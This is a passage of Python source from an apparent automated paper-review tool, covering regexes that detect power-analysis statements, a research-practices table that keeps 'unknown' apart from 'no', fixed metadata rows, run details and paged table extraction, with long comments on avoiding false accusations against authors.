    r"\bpower(?:ed)?\s+(?:analys[ei]s|calculation|to\s+detect)\b"
    r"|\ba[\s-]?priori\s+power\b"
    r"|\bsample\s+size\s+(?:was\s+|were\s+)?(?:determined|calculated|"
    r"estimated|justified|based\s+on)\b"
    r"|\bG\*?Power\b"
    r"|\bminimum\s+detectable\s+effect\b",
    re.I,
)

#: The same words with a negation in front of them mean the OPPOSITE, and a
#: limitations section is where they live: "we were NOT powered to detect
#: differences in secondary outcomes" matched `powered to detect` and would
#: have scored a paper `yes` on a sentence saying it was underpowered.
#: The same words with a negation in front of them mean the OPPOSITE, and a
#: limitations section is where they live. `not|no|under|insufficient` was not
#: enough: MEASURED over the 99-paper corpus, 10 papers matched and 2 were
#: laments -- `10.1177--13623613231159153` says "may instead be due to LIMITED
#: power to detect effects of this magnitude" and scored `yes`. The adjectival
#: forms are the common phrasing and they were all missing.
_POWER_NEGATED = re.compile(
    r"\b(?:not|never|no|under|insufficient(?:ly)?|inadequate(?:ly)?|lack(?:ed|ing)?|"
    r"without|too\s+small|limited|low|reduced|modest|poor|weak|marginal|"
    r"restricted|minimal)\b[^.;]{0,40}$",
    re.I,
)

#: A stated power LEVEL, and only when it is attached to the word power. An
#: a-priori design names a target -- conventionally 80% or 90%. A post-hoc
#: lament names what it got: `10.1186--s13012-023-01333-9` reports "the power
#: to detect an effect size = 0.2 SD was estimated to be 7%", which is not a
#: justification of the sample size but the opposite, and no negation word
#: appears anywhere near it.
#:
#: The attachment matters. A looser pattern would read the 16 out of "80% power
#: to detect a 16% difference" as the power level and reject a correct paper.
#:
#: `(?:[^.]|\.(?=\d))` rather than `[^.]`: statistics prose is full of decimal
#: points, and the sentence this exists to catch reads "the power to detect an
#: effect size = 0.2 SD was estimated to be 7%". A plain `[^.]` stops dead at
#: the point in `0.2` and never reaches the 7%.
_POWER_LEVEL = re.compile(
    r"(\d{1,3}(?:\.\d+)?)\s*%\s*power"
    r"|power\b(?:[^.]|\.(?=\d)){0,90}?"
    r"\b(?:estimated|calculated|computed|found)\s+to\s+be\s+"
    r"(?:only\s+)?(\d{1,3}(?:\.\d+)?)\s*%",
    re.I,
)

#: Below this, a stated power is a report of being underpowered.
_UNDERPOWERED_PCT = 50.0


def _power_statement(text: str) -> "re.Match | None":
    """The first statement of a basis for the sample size that is not a lament.

    Rejects two things a bare keyword match cannot tell apart from a design
    decision: a NEGATED claim ("we were not powered to detect...") and a stated
    power LEVEL too low to be a target ("...was estimated to be 7%").
    """
    text = text or ""
    for match in _POWER_STATED.finditer(text):
        if _POWER_NEGATED.search(text[max(0, match.start() - 60):match.start()]):
            continue
        # A fixed window, not a sentence: splitting on "." lands inside every
        # decimal in the neighbourhood, and the clause carrying the level is
        # routinely past one ("effect size = 0.2 SD was estimated to be 7%").
        window = text[max(0, match.start() - 120):match.end() + 220]
        levels = [float(a or b) for a, b in _POWER_LEVEL.findall(window)]
        if levels and min(levels) < _UNDERPOWERED_PCT:
            continue
        return match
    return None


def _missing_supplements(supp: dict) -> str:
    """Why an absence may NOT be asserted, phrased for a sentence, else "".

    A practice we cannot see because a supplement is missing is `unknown`, not
    `no`. That rule was stated here and broken here.

    THIS READ THE WRONG TYPE, SO IT ALWAYS RETURNED "". It did
    `missing = supp.get("missing") or []` and then tested `isinstance(missing,
    list)` -- but `supplements.audit` returns `missing` THREE-VALUED: True
    (declared and absent), False (nothing missing), None (the paper could not
    be read, so the question was never answered). None of those is ever a
    list, so every real call fell through to "".

    The consequence is not a dormant feature, it is a false accusation. The
    caller reads "" as "nothing blocks the assertion", which selects:

        Sample size justified: no -- No a-priori power analysis is reported,
        and every declared supplement was supplied, so the absence is the
        paper's.

    printed for a paper whose supplement we never received, with the `unknown`
    branch written to prevent exactly that sitting unreachable underneath it.
    The unit tests missed it by exercising the list shape -- the one shape
    `audit` never emits.
    """
    supp = supp or {}
    if not supp:
        # The audit did not run: its caller catches any exception and passes
        # {}. Our crash must not become the paper's failing.
        return "the supplement check could not be run"

    missing = supp.get("missing")
    if missing is None:
        return ("the paper's text could not be read, so whether it cites a "
                "supplement is unknown")
    if missing is False:
        return ""

    # Declared and absent. Name it from the citation styles the audit matched:
    # "a supplement" is not something a reader can go and look for.
    styles = supp.get("styles") or {}
    names = [str(v[0]) for v in styles.values()
             if isinstance(v, (list, tuple)) and v]
    if not names:
        return "supplementary material was declared and not supplied"
    if len(names) == 1:
        return f"{names[0]} was declared and not supplied"
    return (f"{names[0]} (and {len(names) - 1} more) "
            "was declared and not supplied")


def _practice(anatomy: dict, unchecked: list, found: dict, supp: dict,
              refs: list, figures_n: int, paper_dir: Path,
              body_text: str = "") -> list[dict]:
    """Research practices this paper DID and did not follow.

    Reported separately from the findings, and stated positively where the
    practice is present, because these are pervasive across the literature
    rather than peculiar to any one paper -- and a paper that preregistered, or
    reported its assumption checks, or shared its data, has done something most
    have not. Burying that among arithmetic discrepancies reads as though it
    were another fault.

    Every row is derived from data already on disk. Nothing here needs a model.

    `status` is one of `yes`, `no`, `partial`, `unknown`. `unknown` is not a
    polite `no`: it means the extraction cannot see far enough to answer, and
    saying `no` there would charge the authors for our blind spot.
    """
    tests = [t for t in (anatomy or {}).get("tests") or [] if isinstance(t, dict)]
    studies = [s for s in (anatomy or {}).get("studies") or [] if isinstance(s, dict)]
    unchecked_text = " ".join(
        str(u.get("reason", "")) + " " + str(u.get("location", ""))
        for u in unchecked or [] if isinstance(u, dict)).lower()

    rows: list[dict] = []

    # THE WITNESS FOR EVERY TEXT-DERIVED ROW. On a paper whose text never
    # arrived -- no body.md, no XML full text, extraction failed -- four rows
    # still printed `no`: Preregistered, Data or code shared, Reference list
    # machine-readable and Figures available. That is a table of research
    # practices asserting four failures about a paper NOTHING READ. A `no` that
    # means "we could not look" is the same class of error as a false
    # accusation: it is the one table a reader scans for what the authors did
    # wrong, and it does not distinguish the two.
    read_paper = bool((body_text or "").strip())

    def add(practice: str, status: str, detail: str) -> None:
        rows.append({"practice": practice, "status": status, "detail": detail})

    # Gated on the evidence THIS row reads: `preregistered` and `registry_id`
    # are study-level fields of the anatomy, so with no studies extracted the
    # `any()` below is over an empty list and every paper scores `no`.
    if not studies:
        add("Preregistered", "unknown",
            "No studies were extracted, so nothing was read for a "
            "preregistration statement. A limit of the extraction, not a fact "
            "about the paper.")
    else:
        prereg = any(s.get("preregistered") for s in studies)
        registered = any(s.get("registry_id") for s in studies)
        add("Preregistered", "yes" if prereg else ("partial" if registered else "no"),
            "A registry ID is printed, but the analysis is not stated to be preregistered."
            if registered and not prereg else
            ("The study states a preregistration." if prereg else
             "No preregistration is mentioned."))

    # A power analysis is a claim about design, so its ABSENCE is meaningful in
    # a way absence usually is not -- the paper either justified its n or it
    # did not. But absence may only be asserted when we HAD the material: this
    # row could never say `yes`, because it was a string match on the
    # `unchecked` reason text, which only ever gets written when something is
    # missing. A paper that reported a power analysis scored the same as one
    # that reported nothing.
    match = _power_statement(body_text or "")
    stated_none = "power analysis" in unchecked_text and "states none" in unchecked_text
    missing = _missing_supplements(supp)
    if match:
        quote = " ".join(
            (body_text[max(0, match.start() - 60):match.end() + 90]).split())
        add("Sample size justified", "yes",
            f"The paper states a basis for its sample size: “...{quote}...”")
    elif stated_none and not missing:
        add("Sample size justified", "no",
            "No a-priori power analysis is reported, and every declared "
            "supplement was supplied, so the absence is the paper's.")
    elif stated_none:
        # `missing` is now a full clause, because the three things that can
        # block the assertion do not fit one sentence frame: a named
        # supplement, an unreadable paper, and an audit that did not run.
        add("Sample size justified", "unknown",
            f"No power analysis appears in what we read, but {missing}. "
            "The absence cannot be attributed to the paper.")
    else:
        add("Sample size justified", "unknown",
            "Could not be determined from the extracted text.")

    with_checks = [t for t in tests if t.get("assumption_checks_reported")]
    if not tests:
        add("Assumption checks reported", "unknown", "No tests were extracted.")
    elif not with_checks:
        add("Assumption checks reported", "no",
            f"None of the {len(tests)} extracted tests reports checking its assumptions.")
    else:
        add("Assumption checks reported",
            "yes" if len(with_checks) == len(tests) else "partial",
            f"{len(with_checks)} of {len(tests)} tests report an assumption check.")

    # Correction applies to a FAMILY, not to a paper, so the verdict is
    # reported per family and the families are named. One verdict for the whole
    # paper is the lumping the tool descriptions tell the model not to do: a
    # paper that correctly corrected its post-hoc family and correctly left its
    # single confirmatory test alone would score `partial`, which reads as a
    # criticism of a paper that did exactly the right thing.
    #
    # And with no tests extracted this said `no` -- charging the paper for our
    # blind spot. That is `unknown`.
    if not tests:
        add("Multiplicity corrected", "unknown",
            "No tests were extracted, so this could not be assessed. That is a "
            "limit of the extraction, not a finding about the paper.")
    else:
        # The anatomy has no `family_label`; the nearest thing it records is
        # which HYPOTHESIS a test belongs to, and tests of one hypothesis are
        # the clearest case of a family. Where even that is absent the tests
        # go in one bucket and the detail line says so, rather than implying a
        # judgement about which corrections were owed.
        families: dict[str, list[dict]] = {}
        for t in tests:
            families.setdefault(str(t.get("hypothesis_id") or "unlabelled"), []).append(t)
        done, part = [], []
        for label, group in sorted(families.items()):
            n_corr = sum(
                1 for t in group
                if str(t.get("correction_applied") or "none").lower() not in ("none", "")
            )
            (done if n_corr == len(group) else part).append(
                f"{label} ({n_corr}/{len(group)})")
        corrected_any = any(
            str(t.get("correction_applied") or "none").lower() not in ("none", "")
            for t in tests)
        detail = "; ".join(
            (["corrected: " + ", ".join(done)] if done else [])
            + (["not corrected: " + ", ".join(part)] if part else []))
        if len(families) == 1 and "unlabelled" in families:
            detail += (". The tests were not grouped into families, so this is "
                       "one bucket, not a judgement about which corrections "
                       "were owed.")
        add("Multiplicity corrected",
            "yes" if not part else ("partial" if corrected_any else "no"), detail)

    repos = ((found or {}).get("repositories") or {})
    links = sorted({v for vs in repos.values() for v in vs})
    # `found` is the output of a scan over `body_text`. With no body text the
    # scan ran over the empty string, so `no` here was reporting our own
    # missing input as the authors' failure to share anything.
    add("Data or code shared",
        "yes" if links else ("no" if read_paper else "unknown"),
        ", ".join(links) if links else
        ("No repository link was found in the extracted text." if read_paper else
         "No text was extracted from this paper, so nothing was searched for a "
         "repository link."))

    # TWO questions, which were being answered as one. "Does the paper cite a
    # supplement?" is about the publication; "was it supplied to this review?"
    # is about our inputs, and a `no` to the second was reading as a fault of
    # the paper. `_supplement_manifest` is the better witness for the first --
    # the metadata row already uses it, so the two rows used to disagree.
    declared, fetched = _supplement_manifest(paper_dir)
    cited = bool(declared or (supp or {}).get("missing") or (supp or {}).get("files_present"))
    add("Supplementary material cited by the paper",
        "yes" if cited else "unknown",
        f"{declared} declared by the publisher." if declared else
        ("Cited in the text." if cited else
         "Neither the text nor the fetch manifest mentions one, which is not "
         "the same as the paper having none."))
    add("Supplementary material supplied to this review",
        "yes" if (supp or {}).get("files_present") else ("no" if cited else "n/a"),
        "Supplied and read." if (supp or {}).get("files_present") else
        ("Declared but not in the package we were given, so anything reported "
         "only there was invisible to every check. A property of OUR inputs, "
         "not of the publication." if cited else "Nothing to supply."))

    # The last two rows are about OUR inputs, and both say so in their detail --
    # but a `no` in a status column headed with research practices still reads
    # as a fault of the paper, and on a paper that never arrived neither
    # question was even asked. `read_paper` is the witness: no text, no attempt.
    add("Reference list machine-readable",
        "yes" if refs else ("no" if read_paper else "unknown"),
        f"{len(refs)} references extracted." if refs else
        ("Not extracted, so citations cannot be checked." if read_paper else
         "Nothing was extracted from this paper -- neither text nor references -- "
         "so this is a statement about a file we could not read."))

    add("Figures available to the checks",
        "yes" if figures_n else ("no" if read_paper else "unknown"),
        f"{figures_n} figure(s) extracted." if figures_n else
        ("None extracted, so anything reported only in a plot was invisible here."
         if read_paper else
         "Nothing was extracted from this paper, so figure extraction was never "
         "reached. This says nothing about what the paper contains."))
    return rows


def _figure_records(review_dir: Path, paper_dir: Path) -> list[dict]:
    """The extractor's own figure records, which the viewer never read.

    `build_bundle` has always copied `figures.json` into the bundle, but
    `collect` only globbed the directory for image filenames -- so the page
    listed the full-page `page_NNN.png` renders as though they were figures,
    and the caption, page number, bounding box, error-bar meaning, provenance
    tier and warnings that the extractor records for each figure were all
    discarded.
    """
    for d in (review_dir, paper_dir, review_dir / "figures", paper_dir / "figures"):
        data = _load(d / "figures.json")
        if isinstance(data, dict) and data.get("figures"):
            return [f for f in data["figures"] if isinstance(f, dict)]
        if isinstance(data, list) and data:
            return [f for f in data if isinstance(f, dict)]

    # No record file: the extractor wrote crops without one, which is the case
    # for every run so far. Reconstruct what can be reconstructed from the
    # filenames the extractor chose -- `{label}_p{NNN}.png` -- rather than
    # showing nothing. Page renders are excluded; they are not figures.
    out: list[dict] = []
    for d in (review_dir / "figures", paper_dir / "figures"):
        if not d.is_dir():
            continue
        for p in sorted(d.iterdir()):
            if p.suffix.lower() not in {".png", ".jpg", ".jpeg", ".webp"}:
                continue
            if _PAGE_RENDER.match(p.name):
                continue
            m = re.match(r"(?P<label>.+?)_p(?P<page>\d+)$", p.stem)
            out.append({
                "label": (m.group("label").replace("_", " ") if m else p.stem),
                "page": int(m.group("page")) if m else None,
                "image_path": p.name,
                "caption": "",
                "reconstructed_from_filename": True,
                # A filename cannot say whether the crop caught the artwork.
                # Left UNKNOWN rather than defaulting to something reassuring:
                # this path exists precisely because no record file was written.
                "crop_confidence": "unknown",
            })
        if out:
            break
    return out


def _references(paper_dir: Path) -> list[dict]:
    """The bibliography: from `references.json` if the fetch wrote one, else
    read out of the XML here."""
    existing = _load(paper_dir / "references.json")
    if isinstance(existing, list) and existing:
        return existing
    try:
        import xml.etree.ElementTree as ET

        from .extraction.jats import extract_references, find_xml
        xml = find_xml(paper_dir)
        if xml is None:
            return []
        return extract_references(ET.parse(xml).getroot())
    except Exception:
        return []


def _supplement_manifest(paper_dir: Path) -> tuple[int, int]:
    """(declared, fetched) supplementary files, from the fetch manifest.

    `supplements.audit` scans the paper's TEXT for citations, which on an
    XML-fetched paper can be silent even when the publisher lists a supplement:
    on Romano it found nothing while Europe PMC had listed one file that was
    never retrieved. The manifest is the better witness for "does this exist",
    and text silence is not evidence of absence.
    """
    declared = fetched = 0
    for p in sorted(paper_dir.glob("*_supplementary_info.json")):
        data = _load(p) or {}
        for prov in data.get("providers") or []:
            if isinstance(prov, dict):
                declared += int(prov.get("listed") or 0)
        fetched += len(data.get("files") or [])
    return declared, fetched


#: EVERY ROW, IN ORDER, FOR EVERY PAPER.
#:
#: The metadata table is a fixed schema, not a summary of what happened to be
#: found. The first version appended rows conditionally, so a paper with no DOI
#: produced a table with no DOI row -- and two papers side by side had
#: different tables, which makes them impossible to compare and hides absence
#: by making it look like a shorter list. A row whose value is unknown says so
#: and stays in place.
_METADATA_ROWS = (
    "Title", "Authors", "Corresponding author", "Publication", "Year",
    "Volume", "Issue", "Pages", "DOI", "Abstract", "Design",
    "Preregistration", "Registry ID", "Preregistration document",
    "Code / data availability",
    "Supplementary material", "Tables", "Figures", "References",
)

#: What an empty row says. Never "absent" or "the paper does not": every one of
#: these is a scan over extracted text, and something dropped in conversion is
#: indistinguishable here from something never written.
_NOT_FOUND = "not mentioned in paper"
_NOT_RECORDED = "not recorded"

#: Rows whose emptiness means "we read the paper and it does not say", as
#: against a bibliographic field the extractor simply did not capture. The two
#: deserve different words: "not detected" was rejected in review for implying
#: a search wider than the paper itself ever took place.
_TEXT_DERIVED = frozenset({
    "Preregistration", "Registry ID", "Preregistration document",
    "Code / data availability", "Design", "Supplementary material",
})

#: Where the abstract might be, in order of preference. The XML `<abstract>` is
#: the authoritative one; `abstract.md` is what pdf2mdjson wrote and is already
#: copied into every bundle.
_ABSTRACT_FILES = ("abstract.md", "abstract.txt")


def _abstract_text(el) -> str:
    """A JATS `<abstract>` as prose, with its section headings kept apart.

    A flat `itertext()` welds a heading onto the sentence after it:
    `<title>Abstract</title>Obesity is...` came out `AbstractObesity is...`,
    and a structured abstract came out `BackgroundWe... MethodsWe...`. Headings
    are separated, and the redundant `Abstract` heading is dropped.
    """
    out: list[str] = []

    def walk(node) -> None:
        tag = node.tag.rsplit("}", 1)[-1]
        if tag == "title":
            head = " ".join("".join(node.itertext()).split()).rstrip(":")
            if head and head.lower() not in ("abstract", "summary"):
                out.append(head + ":")
        else:
            if node.text:
                out.append(node.text)
            for child in node:
                walk(child)
        if node.tail:
            out.append(node.tail)

    for child in el:
        walk(child)
    if el.text:
        out.insert(0, el.text)
    return " ".join(" ".join(out).split())


def _abstract(paper_dir: Path, review_dir: Path) -> str:
    """The paper's abstract, from the XML if there is one, else from disk.

    It was never on the payload, so the Overview described a paper without
    saying what the paper claims -- the one thing a reader needs before any
    finding about it means anything.
    """
    from .extraction.jats import find_xml

    try:
        xml = find_xml(paper_dir)
        if xml:
            import xml.etree.ElementTree as ET

            root = ET.parse(xml).getroot()
            for el in root.iter():
                if el.tag.rsplit("}", 1)[-1] == "abstract":
                    text = _abstract_text(el)
                    if len(text) > 40:
                        return text
    except Exception:
        pass

    for d in (paper_dir, review_dir):
        for name in _ABSTRACT_FILES:
            p = d / name
            if p.exists():
                try:
                    text = " ".join(p.read_text(encoding="utf-8").split())
                except Exception:
                    continue
                # pdf2mdjson writes a bare `# Abstract` heading on papers that
                # have none; a heading is not an abstract.
                text = re.sub(r"^#+\s*abstract\b:?\s*", "", text, flags=re.I)
                if len(text) > 40:
                    return text
    return ""


def _paper_facts(paper_dir: Path, body_text: str, review_dir: Path,
                 supp: dict, figures: list[str], meta: dict,
                 references: list[dict]) -> list[dict]:
    """The fixed metadata block, identical in shape for every paper.

    Each row is `{fact, value, detail}` and every name in `_METADATA_ROWS`
    appears exactly once, in that order, whether or not a value was found.
    """
    found_rows: dict[str, dict] = {}

    def add(fact: str, value: str, detail: str = "") -> None:
        found_rows[fact] = {"fact": fact, "value": str(value or ""), "detail": detail}

    try:
        from . import artefacts
        found = artefacts.find(body_text or "")
        prereg = artefacts.preregistration(body_text or "", found)
    except Exception:
        found, prereg = {}, {}

    add("Title", meta.get("title"))
    add("Authors", meta.get("authors"))
    corresponding = meta.get("corresponding_author") or ""
    email = meta.get("corresponding_email") or ""
    add("Corresponding author",
        f"{corresponding} <{email}>" if corresponding and email
        else corresponding or (f"<{email}>" if email else ""))
    add("Publication", meta.get("journal"))
    add("Year", meta.get("year"))
    add("Volume", meta.get("volume"))
    add("Issue", meta.get("issue"))
    add("Pages", meta.get("pages"))
    add("DOI", meta.get("doi"))
    add("Abstract", _abstract(paper_dir, review_dir))
    add("Design", meta.get("study_design"))
    add("References", f"{len(references)} extracted" if references else "")

    status = (prereg or {}).get("status")
    add("Preregistration",
        # `mentioned_unverified` RENDERS AS A QUESTION, NOT AN ANSWER. It is the
        # state a bare keyword now produces: the paper uses the word, and the
        # pattern cannot tell a claim about THIS study from a negation, a
        # citation of someone else's registered report, or a remark about
        # future work. Saying "yes" there is what put `Preregistration: yes`
        # beside Title and DOI on a paper that said it was not registered.
        # An unmapped status still falls to "", which is the safe default.
        {"preregistered": "yes",
         "explicitly_not_preregistered": "no -- the paper states it was not",
         "mentioned_unverified": "mentioned, but not verified -- see the passage",
         "unknown_no_text": "unknown -- no text could be read",
         "not_mentioned": ""}.get(status, ""),
        (prereg or {}).get("note", "") if status == "preregistered" else "")

    regs = (found or {}).get("registrations") or {}
    ids = [v for vs in regs.values() for v in vs]
    if ids:
        add("Registry ID", ", ".join(ids))
    else:
        # A registry ID that is PRINTED but MALFORMED is not the same as none,
        # and "not detected" hides the more interesting case. Romano prints
        # `NCT0204349` -- seven digits where NCT numbers have eight -- so the
        # strict pattern correctly rejects it and the paper correctly has an
        # unresolvable registration. Say which of the two happened.
        near = _MALFORMED_REGISTRY.findall(body_text or "")
        # Empty, not "not detected": the fixed-schema pass below supplies the
        # wording, so that every unfilled row in the table says the same thing.
        add("Registry ID",
            f"{', '.join(sorted(set(near)))} -- malformed" if near else "",
            ("Printed in the paper but not a well-formed identifier, so it "
             "resolves to nothing." if near else ""))

    # REPOSITORIES ONLY. This read `found["all"]`, which unions repositories
    # AND registrations, so a ClinicalTrials number or a PROSPERO ID landed in
    # the row headed "Code / data availability" -- claiming the paper shared
    # code or data when it had done nothing of the kind. `artefacts.find`
    # already draws the distinction; the row was simply reading the wrong key.
    repos = (found or {}).get("repositories") or {}
    links = sorted({v for vs in repos.values() for v in vs})
    has_stmt = bool((found or {}).get("has_availability_statement"))
    if links:
        add("Code / data availability", "\n".join(links),
            "" if has_stmt else "Found in the text, but with no data-availability "
                                "statement, so the links may be incidental.")
    else:
        add("Code / data availability", "",
            "A data-availability statement is present but names no repository."
            if has_stmt else "")

    # The preregistration DOCUMENT, separate from the trial registration above.
    # An OSF or AsPredicted link is a plan a reader can open and compare against
    # what was reported; an NCT number is an entry in a registry. Both were
    # being poured into the same row.
    prereg_links = sorted(
        v for k, vs in ((found or {}).get("registrations") or {}).items()
        if k not in ("clinicaltrials", "isrctn", "drks")
        for v in vs
    ) + sorted(v for v in (repos.get("osf") or []))
    add("Preregistration document", "\n".join(prereg_links),
        "Open it and compare the registered primary outcome against the "
        "reported one -- that comparison is not automated here."
        if prereg_links else "")

    # Deliberately phrased as a property of THIS REVIEW's inputs, not of the
    # publication. The distinction matters and `supplements.audit` cannot draw
    # it on its own: it scans the extracted text for citations, and on Romano
    # found none -- while the fetch manifest beside it records that Europe PMC
    # listed a supplementary file that was never retrieved. Text silence is not
    # evidence of no supplement; the manifest is the better witness.
    declared, fetched = _supplement_manifest(paper_dir)
    if (supp or {}).get("files_present"):
        add("Supplementary material", "supplied to this review")
    elif declared and not fetched:
        add("Supplementary material", f"{declared} declared, none supplied to this review",
            "Published, but not in the package we were given -- not a fault of the paper.")
    elif (supp or {}).get("missing"):
        add("Supplementary material", "cited, but not supplied to this review",
            "Not a statement about the publication -- only about what we were given.")
    else:
        add("Supplementary material", "",
            "Neither the text nor the fetch manifest mentions one.")

    # Tables and figures get their own rows. They come from different
    # extractors with different failure modes -- the XML path returns a real
    # cell grid, the PDF path frequently returns nothing at all -- so one row
    # covering both would hide which of the two this review actually saw.
    n_tables, tables_from = _table_provenance(paper_dir, review_dir)
    if n_tables:
        add("Tables", f"{n_tables} extracted", f"From the {tables_from}.")
    else:
        add("Tables", "none extracted",
            "Any table in this paper was invisible to the checks. A table the "
            "PDF path cannot rule is still printed in the page text, so this "
            "is a limit of OUR extraction, not evidence the paper has none.")

    verified = _figures_human_verified(review_dir, paper_dir)
    # Count figures, not page renders. `figures/` also holds the extractor's
    # full-page `page_NNN.png` images, so a glob of the directory reported two
    # figures for a paper that has one.
    n_fig = len([f for f in figures if not _PAGE_RENDER.match(f)])
    if n_fig:
        add("Figures", f"{n_fig} extracted",
            "human-verified" if verified else "automated extraction, not human-verified")
    else:
        add("Figures", "not extracted",
            "The review is figure-blind: anything appearing only in a plot was not seen.")

    # The fixed schema. Every name appears once, in order, whether or not
    # anything filled it -- see `_METADATA_ROWS`.
    out: list[dict] = []
    for name in _METADATA_ROWS:
        row = found_rows.get(name) or {"fact": name, "value": "", "detail": ""}
        if not row["value"]:
            row = {**row, "value": _NOT_FOUND if name in _TEXT_DERIVED else _NOT_RECORDED}
        out.append(row)
    return out


def _run_facts(review_dir: Path, run_meta: dict) -> list[dict]:
    """When this was run, by what, and at what cost.

    `analysed_at`, `version` and `effort` are recorded in `run_meta` from now
    on. Reviews produced before that carry none of them, so the timestamp falls
    back to the mtime of `run_meta.json` and says that it did -- a file date is
    not a run date, and presenting one as the other would be worse than
    omitting it.

    The fallback itself lives in `report_render.resolve_run_stamp`, shared with
    the report: this pane and `report.md` answer the same question about the same
    run, and two copies of the rule is two places for one of them to start
    passing off a file date as a run date.
    """
    from .report_render import resolve_run_stamp
    from .version import NOT_RECORDED, pipeline_version

    rows: list[dict] = []

    def add(fact: str, value: Any, detail: str = "") -> None:
        if value not in (None, "", []):
            rows.append({"fact": fact, "value": str(value), "detail": detail})

    stamp = resolve_run_stamp(run_meta, review_dir)
    detail = ("Taken from the file's timestamp -- this run predates recording it."
              if stamp.get("analysed_at_source") == "file_mtime" else "")
    add("Analysed", stamp.get("analysed_at") or NOT_RECORDED, detail)
    # The composite, not the bare release number: `version` moves about once a
    # month while the code moves several times a day, so "0.2.0" alone does not
    # identify what ran. An archived run that recorded no sha still reads
    # honestly -- `pipeline_version` formats what is there and names what is not.
    add("Pipeline version", pipeline_version(stamp))
    add("Mode", run_meta.get("mode"))

    stages = run_meta.get("stages") or {}
    # EVERY MODEL THAT RAN, not just the one that carried the bill.
    #
    # This row read `primary_billed_model`, so the Overview said
    # "Model | claude-opus-5" while Run details, reading `models_resolved` from
    # the same stages, said "more than one model was used in this stage". One
    # page contradicting another about what produced the review, in a document
    # whose value is that its claims can be audited.
    #
    # MEASURED on the archived cerebrolysin run: both stages resolve
    # ['claude-haiku-4-5-20251001', 'claude-opus-5'] and bill opus. The haiku
    # calls are real work -- a reader deciding how much to trust a judgement is
    # entitled to know a second model was in the loop, and which one signed for
    # it is the less interesting half.
    billed = sorted({str((v or {}).get("primary_billed_model") or (v or {}).get("model"))
                     for v in stages.values() if isinstance(v, dict)} - {"None"})
    resolved = sorted({m for v in stages.values() if isinstance(v, dict)
                       for m in ((v or {}).get("models_resolved") or [])})
    models = resolved or billed
    detail = ""
    if resolved and len(resolved) > 1 and billed:
        detail = (f"More than one model ran. {', '.join(billed)} carried the "
                  "billing; the others were used within the same stages.")
    add("Model", ", ".join(models), detail)
    # Per stage where recorded, else the run-level value. Both exist because a
    # future run may vary effort between the sweep and the editorial pass, and
    # the reader should see that rather than one number standing for both.
    efforts = sorted({str((v or {}).get("effort")) for v in stages.values()
                      if isinstance(v, dict)} - {"None"})
    add("Reasoning effort",
        ", ".join(efforts) or run_meta.get("effort") or "not recorded")
    # NO COST ROW. This used to print the run's `total_cost_usd` to 4 dp. The
    # bundle is forwarded to the authors of the paper it criticises, and what
    # the review cost us is a fact about our billing, not about their work --
    # printed beside a verdict it reads as a price put on the accusation. The
    # figure is still in the review directory's `run_meta.json`, which is not
    # the shippable artefact. See `_is_operator_key`.
    # ABSENT IS NOT ZERO MINUTES. `parallel._usage_totals` writes `None` rather
    # than `0.0` when nothing was timed, and its own comment says why -- "0.0
    # would print a false measurement". The `or 0` here reintroduced exactly
    # that: a run whose total was never recorded displayed "Wall time 0 min"
    # beside stage timings summing to half an hour.
    _wall = run_meta.get("total_wall_seconds")
    if _wall is None:
        _stage_secs = sum(float((s or {}).get("wall_seconds") or 0)
                          for s in (run_meta.get("stages") or {}).values()
                          if isinstance(s, dict))
        add("Wall time", f"{round(_stage_secs / 60)} min (summed from stages)"
            if _stage_secs else "not recorded")
    else:
        add("Wall time", f"{round(float(_wall) / 60)} min")
    add("Stages run", ", ".join(stages))
    # WHICH PIPELINE, beside the stages: a partial one (one tool, no
    # adjudicator) is named as such in the shareable viewer too, not only in
    # report.md.
    _pipeline = run_meta.get("pipeline")
    if isinstance(_pipeline, dict):
        _uses = ", ".join(str(m.get("use")) for m in _pipeline.get("modules") or []
                          if isinstance(m, dict))
        add("Pipeline", f"{_pipeline.get('name')} — "
            + ("complete review" if _pipeline.get("complete_review")
               else "PARTIAL: not a complete review"),
            f"modules: {_uses}")
    return rows


#: A grid this big is unreadable in a 320px strip card and would bloat the
#: payload; the full one is a click away in the rendered pane.
_STRIP_TABLE_ROWS = 14
_STRIP_TABLE_COLS = 10


def _paged_table(xml: str, num: int, max_pages: int = 40) -> dict:
    """`get_table`, but with `cells` PAGED TO THE END rather than windowed.

    `get_table` returns `data` (the whole grid) in full and windows `cells` to a
    character budget, stating the window in `cells_row_window` / `cells_total`.
    Every caller that consumes `cells` therefore has to page, and this one did
    not: `_table_records` made a single call, so `_table_sections` split a
    PARTIAL cell list and the viewer published a section list shorter than the
    paper's.

    MEASURED on 10.1007--s11064-023-03861-8 by the architecture review: Table 2
    yields 3 sections windowed and 8 paged; Table 4, 2 versus 8; Table 5, 2
    versus 6. A reader comparing the strip against the PDF sees sections that
    are simply absent, and nothing on the page says they were dropped by us.
    That is this repo's oldest bug class -- our truncation presented as the
    paper's content -- reaching the one surface built to let a human check our
    work against the source.

    Mirrors the loop in `prepass.paper_tables`, which has always paged. Sets
    `cells_short` when the walk still ends early, because a partial list that
    SAYS it is partial is a limitation, and one that does not is a false
    statement about the paper.
    """
    from .extraction.jats import get_table

    full = get_table(xml, num)
    if not full.get("found"):
        return full
    cells = list(full.get("cells") or [])
    total = full.get("cells_total")
    pages = 0
    while total and len(cells) < total and pages < max_pages:
        pages += 1
        nxt = get_table(xml, num, first_row=int(cells[-1].get("row") or 0) + 1)
        more = nxt.get("cells") or []
        if not more:
            break
        cells += more
    full = dict(full)
    full["cells"] = cells
    full["cells_short"] = bool(total) and len(cells) < total
    return full


def _processed_cells(full: dict, grid: list[list]) -> dict:
    """Every cell's TYPED reading, positioned on the same grid the viewer draws.

    Returns `{n, coverage, kind_counts, unparsed, cells: {"r,c": {...}}}`. The
    key is the grid slot so the JS can lay the processed view directly over the
    raw one; a cell whose column heading is not in `headers` is DROPPED rather
    than guessed at, because an overlay in the wrong slot is worse than a gap.

    Position comes from Python, not JS, for the same reason `_table_sections`
    computes banner rows in Python: the indices have to be into the grid that is
    actually rendered, and a second implementation is a second chance to drift.
    """
    from .census import parse_cells

    cells = list(full.get("cells") or [])
    headers = [str(h) for h in (full.get("headers") or [])]
    typed = parse_cells(cells)
    placed: dict[str, dict] = {}
    n_unplaced = 0
    for src, cell in zip(cells, typed.get("cells") or []):
        try:
            r = int(src.get("row") or 0)
            c = headers.index(str(src.get("col_label")))
        except (TypeError, ValueError):
            n_unplaced += 1
            continue
        if not 0 <= r < len(grid):
            n_unplaced += 1
            continue
        slot = {"kind": cell.get("kind")}
        for k in ("value", "sd", "se", "percent", "count", "low", "high"):
            if cell.get(k) is not None:
                slot[k] = cell[k]
        if cell.get("markers"):
